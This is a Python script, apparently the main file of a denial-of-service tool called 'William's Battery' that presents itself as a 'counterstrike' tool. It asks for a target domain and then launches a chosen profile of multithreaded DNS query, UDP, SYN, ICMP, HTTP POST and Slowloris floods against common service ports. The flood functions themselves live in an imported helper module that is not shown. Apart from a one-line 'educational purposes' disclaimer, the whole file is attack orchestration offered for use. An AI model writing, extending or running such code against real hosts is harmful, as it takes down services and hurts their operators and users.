# main.py (Updated to integrate DNS Query Flood into blended profiles)

import threading
import time
import socket
import counter_strike_helper


def launch_attack_thread(target_func, args_tuple):
    """Helper to create, start, and return a daemon thread."""
    thread = threading.Thread(target=target_func, args=args_tuple)
    thread.daemon = True
    thread.start()
    return thread


def full_scale_counter_strike(target):
    """Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack."""
    print("=" * 60 + "\nMODE: FULL SCALE COUNTER-STRIKE (SIEGE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    params = {
        "threads": 250,
        "slowloris_sockets": 200,
        "duration": 360,
    }
    print(
        f"[CONFIG] Siege mode: Using {params['threads']} threads and {params['slowloris_sockets']} Slowloris sockets per vector.")

    # --- Launch Network Layer Floods (L3/L4 & L7-DNS) ---
    print("[+] Preparing Network Layer vectors (UDP, SYN, ICMP, DNS Query)...")
    # NEW: DNS Query Flood
    args = (target, params["duration"], stop_event, pause_event, params["threads"])
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
    # UDP, SYN, ICMP
    for port in [53, 443, 123]:  # UDP
        args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
    for port in [80, 443, 22, 3389, 25, 587]:  # SYN
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
    args = (target, params["duration"], stop_event, pause_event, params["threads"])
    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))

    # --- Launch Application Layer Attacks (L7) ---
    print("[+] Preparing Application Layer vectors (POST Flood, Slowloris)...")
    for port in [80, 443, 8080, 8443]:  # HTTP POST
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
    for port in [80, 443]:  # Slowloris
        args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))

    print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
    try:
        while any(t.is_alive() for t in attack_threads): time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Signaling all threads to stop...")
        stop_event.set()


def fast_scale_counter_strike(target):
    """Launches a FAST, INTENSE, blended, multi-threaded counter-attack."""
    print("=" * 60 + "\nMODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    params = {"threads": 100, "duration": 60}
    print(f"[CONFIG] Surgical mode: Using {params['threads']} threads per attack vector.")

    # NEW: DNS Query Flood
    args = (target, params["duration"], stop_event, pause_event, params["threads"])
    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
    # Other focused attacks
    for port in [53, 443]:  # UDP
        args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
    for port in [80, 443, 22]:  # SYN
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
    for port in [80, 443]:  # HTTP POST
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))

    print(f"[+] Fast-scale attack launched. Running for {params['duration']}s. Press Ctrl+C to stop.")
    try:
        time.sleep(params["duration"])
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()


def adaptive_strike(target):
    """Launches a 'Fast Scale' profile managed by an adaptive controller."""
    print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
    try:
        # ... (user input remains the same)
        check_port = int(input("Enter the port to monitor for target status (e.g., 80 or 443): "))
        check_interval = int(input("Enter the status check interval in seconds (e.g., 15): "))
        total_duration = int(input("Enter the total attack duration in seconds (e.g., 600): "))
        threads = int(input("Enter number of threads per attack vector (e.g., 150): "))
        target_ip = socket.gethostbyname(target)
    except (ValueError, socket.gaierror) as e:
        print(f"[!] Invalid input or could not resolve host: {e}. Aborting.")
        return

    stop_event, pause_event = threading.Event(), threading.Event()

    # Define the attack profile, now including the DNS Query flood
    attack_profile = [
        (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.attack_udp, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads)),
    ]

    for func, args in attack_profile:
        launch_attack_thread(func, args)

    controller_args = (target_ip, check_port, stop_event, pause_event, check_interval)
    launch_attack_thread(counter_strike_helper.adaptive_attack_controller, controller_args)

    print(f"[+] Adaptive attack launched. Total duration: {total_duration}s. Press Ctrl+C to stop.")
    try:
        time.sleep(total_duration)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()
        time.sleep(2)


# --- Main Execution Block with Updated Descriptions ---
if __name__ == "__main__":
    print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
    print("This tool is for educational purposes ONLY. Use responsibly and legally.")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))

    try:
        options_text = """
Select an Attack Profile:
  1: Full Scale Counterstrike (Long siege with all vectors, including Slowloris and DNS Query Flood)
  2: Fast Counterstrike (Short burst with POST and DNS Query Floods)
  3: Adaptive Counterstrike (Smart attack with POST and DNS Query Floods)

Please enter your option: """
        options = int(input(options_text))

        if options == 1:
            full_scale_counter_strike(target_domain)
        elif options == 2:
            fast_scale_counter_strike(target_domain)
        elif options == 3:
            adaptive_strike(target_domain)
        else:
            print("Invalid option selected. Exiting.")

    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")